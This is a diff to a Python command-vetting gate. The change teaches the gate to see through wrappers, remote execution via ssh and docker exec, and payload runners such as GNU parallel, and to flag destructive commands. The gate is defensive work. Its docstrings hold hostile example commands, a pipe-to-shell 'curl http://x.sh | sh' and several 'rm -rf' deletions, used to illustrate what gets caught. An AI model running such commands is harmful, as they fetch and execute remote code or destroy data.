@@ -131,6 +131,70 @@ so the peel does not mistake the value for the wrapped command (PRD §3.2 step 4
 WRAPPER_NUMERIC_ARG = frozenset({"timeout"})
 """Wrappers whose first positional argument is a duration, not the wrapped command."""
 
+WRAPPER_HEAD_VALUE_FLAGS: dict[str, frozenset[str]] = {
+    "watch": frozenset({"-n", "--interval"}),
+    "flock": frozenset({"-w", "--wait", "--timeout", "-E", "--conflict-exit-code",
+                        "-c", "--command"}),
+    "chroot": frozenset({"--userspec", "--groups"}),
+    "caffeinate": frozenset({"-t"}),
+    "systemd-run": frozenset({"-u", "--unit", "-p", "--property", "-E", "--setenv", "--slice",
+                              "--description", "--uid", "--gid", "--nice", "--working-directory",
+                              "-M", "--machine", "--on-active", "--on-calendar"}),
+    "uvx": frozenset({"--from", "--with", "--python", "-p", "--project", "--directory"}),
+}
+"""Value-taking options PER wrapper, REPLACING :data:`WRAPPER_VALUE_FLAGS` for these heads.
+
+Replacing rather than extending is the point: the same letter means different things to
+different wrappers. ``flock -n`` is ``--nonblock``, a boolean — reading it as a value flag (which
+it is for ``nice``) would eat the lock file and peel to the wrong token. Sources: watch(1),
+flock(1), chroot(1), caffeinate(8), systemd-run(1), `uvx` (uv docs). A ``--flag=value`` spelling
+needs no entry."""
+
+WRAPPER_POSITIONAL_SKIPS: dict[str, int] = {"flock": 1, "chroot": 1}
+"""Wrappers whose first positional is an OPERAND, not the wrapped command: ``flock LOCKFILE CMD``
+(a file or an fd number) and ``chroot DIR CMD``."""
+
+WRAPPER_SUBCOMMANDS: dict[str, tuple[str, ...]] = {"poetry": ("run",), "pipx": ("run",)}
+"""Wrappers that only wrap under one subcommand. ``poetry run rm -rf x`` runs the ``rm``;
+``poetry install`` runs poetry's own installer, and peeling it would sign the segment as the
+unrelated coreutils ``install``. No match means no peel."""
+
+WRAPPER_INLINE_COMMAND_FLAGS: dict[str, tuple[str, ...]] = {"flock": ("-c", "--command")}
+"""Wrappers that take their command as a STRING instead of as argv, so the string is shell text
+to recurse into, exactly like ``sh -c`` (PRD §3.2 step 5). ``flock file -c "rm -rf x"`` has no
+argv to peel to, and without this the command never appeared (flock(1))."""
+
+SSH_VALUE_FLAGS = frozenset({
+    "-b", "-c", "-D", "-E", "-e", "-F", "-I", "-i", "-J", "-L", "-l", "-m", "-O", "-o", "-P",
+    "-p", "-Q", "-R", "-S", "-W", "-w",
+})
+"""ssh(1) options that consume the next argument; the first token after them is the HOST."""
+
+DOCKER_EXEC_VALUE_FLAGS = frozenset({
+    "-e", "--env", "--env-file", "-u", "--user", "-w", "--workdir", "--detach-keys",
+})
+"""docker-exec(1) options that consume the next argument; the first token after them is the
+CONTAINER."""
+
+REMOTE_EXEC_COMMANDS: dict[str, tuple[tuple[str, ...], frozenset[str], bool]] = {
+    "ssh": ((), SSH_VALUE_FLAGS, True),
+    "docker": (("exec",), DOCKER_EXEC_VALUE_FLAGS, False),
+}
+"""Commands that run their trailing arguments as a command SOMEWHERE ELSE — ``ssh [opts] HOST
+CMD…`` and ``docker exec [opts] CONTAINER CMD…`` (finding R9).
+
+The remote command is classified recursively as a payload, so ``ssh host 'curl http://x.sh | sh'``
+surfaces the pipe-to-shell instead of one unfamiliar ``ssh``, and the host segment is marked
+``inline_interpreter``: what runs under this key is not on this command line in any checkable
+form, which is the same honesty ``eval`` and ``source FILE`` get.
+
+Each entry is (subcommand prefix, value-taking options, the remote side runs a SHELL). Exactly
+one positional — the host or the container — stands between the options and the command. The
+last field is the difference between the two: ``ssh`` concatenates its remaining arguments with
+spaces and hands the string to the remote user's shell, so the payload is shell TEXT; ``docker
+exec`` execs the argv it is given with no shell at all, so the payload is argv and
+``docker exec c sh -c 'rm -rf /srv'`` keeps its quoting (ssh(1), docker-exec(1))."""
+
 SUBCOMMAND_VALUE_FLAGS: dict[str, frozenset[str]] = {
     "git": frozenset({"-c", "-C", "--git-dir", "--work-tree", "--namespace", "--exec-path"}),
 }
@@ -166,9 +230,19 @@ SOURCE_SIGNATURE = "source"
 """Canonical spelling for the ``source``/``.`` builtin, so both spellings of the same command
 share one grant key (``source <script>``) instead of the second hiding behind a lone dot."""
 
-SHELL_INTERPRETERS = frozenset({"sh", "bash", "zsh"})
-"""Interpreters whose inline payload is *shell*, so PRD §3.2 step 5 recurses into it. A
-``python3 -c`` payload is python and is not re-parsed."""
+NON_SHELL_INTERPRETERS = frozenset({"python", "python3", "node", "ruby", "perl", "uv run"})
+"""The interpreters in ``GateSettings.interpreter_commands`` whose inline payload is NOT shell.
+
+Everything else in that set has its ``-c`` string recursed into as shell text (PRD §3.2 step 5).
+Naming the exceptions rather than the shells is what makes the knob real (finding R9b): the
+hardcoded ``{"sh", "bash", "zsh"}`` it replaces meant adding ``fish`` to ``interpreter_commands``
+changed the signature but left ``fish -c 'rm -rf x'`` unopened. A ``python3 -c`` payload is
+python and is not re-parsed as shell."""
+
+
+def _is_shell_interpreter(head: str, settings: GateSettings) -> bool:
+    """Is this command's inline payload shell text? See :data:`NON_SHELL_INTERPRETERS`."""
+    return head in settings.interpreter_commands and head not in NON_SHELL_INTERPRETERS
 
 COMPOSING_RUNNERS = frozenset({"uv run"})
 """Commands that run another command in a changed environment. PRD §3.2 step 7 lists
@@ -188,11 +262,35 @@ FIND_DELETE_SIGNATURE = "find -delete"
 """PRD §3.2 step 5 / ``DESTRUCTIVE_SIGNATURES_DEFAULT``: ``find -delete`` deletes without a
 payload command, so the primary joins the signature (critic finding 4)."""
 
+FIND_COMMAND = "find"
+"""The one payload runner whose command sits behind a primary (``-exec``) instead of simply
+following the options — every other member of ``settings.payload_commands`` goes through
+:func:`_command_payload`."""
+
 XARGS_VALUE_FLAGS = frozenset({"-n", "-I", "-i", "-P", "-d", "-a", "-E", "-s", "-L", "--max-args",
                                "--replace", "--max-procs", "--delimiter", "--arg-file", "--eof",
                                "--max-chars", "--max-lines"})
 """``xargs`` options that consume the next argument; the first token after them is the
 payload command (PRD §3.2 step 5)."""
+
+PARALLEL_VALUE_FLAGS = frozenset({"-j", "--jobs", "-n", "--max-args", "-N", "-I", "--replace",
+                                  "-L", "--max-lines", "-S", "--sshlogin", "--delay", "--timeout",
+                                  "--joblog", "--results", "--tmpdir", "--colsep", "-d",
+                                  "--delimiter"})
+"""GNU ``parallel`` options that consume the next argument (parallel(1)), same role as
+:data:`XARGS_VALUE_FLAGS`."""
+
+PAYLOAD_VALUE_FLAGS: dict[str, frozenset[str]] = {
+    "xargs": XARGS_VALUE_FLAGS,
+    "parallel": PARALLEL_VALUE_FLAGS,
+}
+"""Per-runner option tables for :func:`_command_payload`. A runner with no entry is read as
+"options are booleans", which is the safe reading: at worst the payload starts one token late and
+the segment stays unfamiliar rather than silently read-only."""
+
+PAYLOAD_ARGUMENT_SEPARATORS = (":::", "::::")
+"""GNU ``parallel`` separates the command from its ARGUMENTS with these (``parallel rm -rf {} :::
+a b``). Everything after one is data for the command, not more command (parallel(1))."""
 
 GIT_CONFIG_SIGNATURE = "git config"
 """The plain ``git config`` key. A write that is not one of
@@ -785,12 +883,12 @@ def _build(
     payload_texts: list[str] = []
     find_delete = False
     if head in settings.payload_commands:
-        if head == "xargs":
-            payload = _xargs_payload(argv)
+        if head == FIND_COMMAND:
+            payload_argvs, find_delete = _find_payloads(argv)
+        else:
+            payload = _command_payload(argv)
             if payload:
                 payload_argvs.append(payload)
-        else:
-            payload_argvs, find_delete = _find_payloads(argv)
 
     signature, inline = _signature(argv, settings, find_delete=find_delete)
     force_destructive = False
@@ -800,10 +898,23 @@ def _build(
     if head == "git":
         extras.extend(_git_inline_config_segments(argv, settings))
 
-    if head in SHELL_INTERPRETERS:
+    if _is_shell_interpreter(head, settings):
         payload_texts = _inline_payloads(argv, settings)
     elif head in settings.inline_by_nature:
         payload_texts = _inline_by_nature_payload(argv)
+
+    if head in WRAPPER_INLINE_COMMAND_FLAGS:
+        payload_texts = _flag_values(list(argv[1:]), WRAPPER_INLINE_COMMAND_FLAGS[head])
+        inline = inline or bool(payload_texts)
+
+    remote = _remote_command(argv)
+    if remote is not None:
+        tokens, shell_joined = remote
+        if tokens and shell_joined:
+            payload_texts = [*payload_texts, " ".join(tokens)]
+        elif tokens:
+            payload_argvs = [*payload_argvs, tokens]
+        inline = True
 
     for payload in payload_argvs:
         segment, more, _, _ = _build(payload, settings, [], cwd)
@@ -850,7 +961,15 @@ def _make_segment(
     written = list(redirect_targets) + _write_targets(signature, argv, settings)
     resolved = [_resolve_target(cwd or _Cwd(), target) for target in written]
     targets = [target for target, _ in resolved]
-    destructive = force_destructive or signature in settings.destructive_signatures
+    # A BARE command name in the destructive set condemns every spelling of it: `docker` is
+    # there, so `docker exec …` and `docker run …` are destructive too (finding R9 — the
+    # subcommand key made them merely unfamiliar, and therefore grantable). A flagged entry like
+    # `rm -rf` says nothing about plain `rm`, which is the point of critic finding 12.
+    destructive = (
+        force_destructive
+        or signature in settings.destructive_signatures
+        or signature.split(" ", 1)[0] in settings.destructive_signatures
+    )
     read_only = (
         (force_read_only or signature in settings.read_only_signatures)
         and not destructive
@@ -877,6 +996,8 @@ def _peel(argv: list[str], settings: GateSettings) -> list[str]:
     """
     while len(argv) > 1 and argv[0] in settings.wrapper_commands:
         head, rest = argv[0], argv[1:]
+        value_flags = WRAPPER_HEAD_VALUE_FLAGS.get(head, WRAPPER_VALUE_FLAGS)
+        skips = WRAPPER_POSITIONAL_SKIPS.get(head, 0)
         index = 0
         while index < len(rest):
             token = rest[index]
@@ -884,12 +1005,21 @@ def _peel(argv: list[str], settings: GateSettings) -> list[str]:
                 index += 1
                 continue
             if token.startswith("-") and token != "-":
-                index += 2 if token in WRAPPER_VALUE_FLAGS else 1
+                index += 2 if token in value_flags else 1
                 continue
             if head in WRAPPER_NUMERIC_ARG and DURATION_RE.match(token):
                 index += 1
                 continue
+            if skips:
+                skips -= 1
+                index += 1
+                continue
             break
+        required = WRAPPER_SUBCOMMANDS.get(head)
+        if required is not None:
+            if index >= len(rest) or rest[index] not in required:
+                return argv
+            index += 1
         if index >= len(rest):
             return argv
         argv = rest[index:]
@@ -941,16 +1071,56 @@ def _find_payloads(argv: list[str]) -> tuple[list[list[str]], bool]:
     return payloads, delete
 
 
-def _xargs_payload(argv: list[str]) -> list[str]:
-    """PRD §3.2 step 5: the command ``xargs`` will run (empty when it defaults to ``echo``)."""
+def _remote_command(argv: list[str]) -> tuple[list[str], bool] | None:
+    """The command ``ssh``/``docker exec`` will run elsewhere — (tokens, the remote side is a
+    shell) — or None if this is neither.
+
+    The token list is empty for a remote shell with no command (``ssh host``): still code under
+    this key, just none of it visible here. See :data:`REMOTE_EXEC_COMMANDS` (finding R9).
+    """
+    entry = REMOTE_EXEC_COMMANDS.get(argv[0])
+    if entry is None:
+        return None
+    prefix, value_flags, shell_joined = entry
+    rest = argv[1:]
+    if prefix:
+        if tuple(rest[: len(prefix)]) != prefix:
+            return None
+        rest = rest[len(prefix):]
+    index = 0
+    while index < len(rest):
+        token = rest[index]
+        if token.startswith("-") and token != "-":
+            index += 2 if token in value_flags else 1
+            continue
+        break
+    return (rest[index + 1:] if index < len(rest) else []), shell_joined
+
+
+def _command_payload(argv: list[str]) -> list[str]:
+    """PRD §3.2 step 5: the command a payload runner will run — its first non-option token onward.
+
+    The rule for every member of ``settings.payload_commands`` except ``find`` (whose payload sits
+    behind a primary). Options and their values are skipped per :data:`PAYLOAD_VALUE_FLAGS`, and
+    the argument list GNU parallel appends after :data:`PAYLOAD_ARGUMENT_SEPARATORS` is data, not
+    part of the command. Empty when the runner falls back to its default (``xargs`` → ``echo``).
+
+    Generic on purpose (finding R9b): adding ``parallel`` to ``payload_commands`` in config has to
+    be enough to lift ``parallel rm -rf {} ::: a b``, with no code change here.
+    """
+    value_flags = PAYLOAD_VALUE_FLAGS.get(argv[0], frozenset())
     index = 1
     while index < len(argv):
         token = argv[index]
-        if token.startswith("-"):
-            index += 2 if token in XARGS_VALUE_FLAGS else 1
+        if token.startswith("-") and token != "-":
+            index += 2 if token in value_flags else 1
             continue
         break
-    return argv[index:]
+    payload = argv[index:]
+    for separator in PAYLOAD_ARGUMENT_SEPARATORS:
+        if separator in payload:
+            payload = payload[: payload.index(separator)]
+    return payload
 
 
 def _inline_payloads(argv: list[str], settings: GateSettings) -> list[str]:
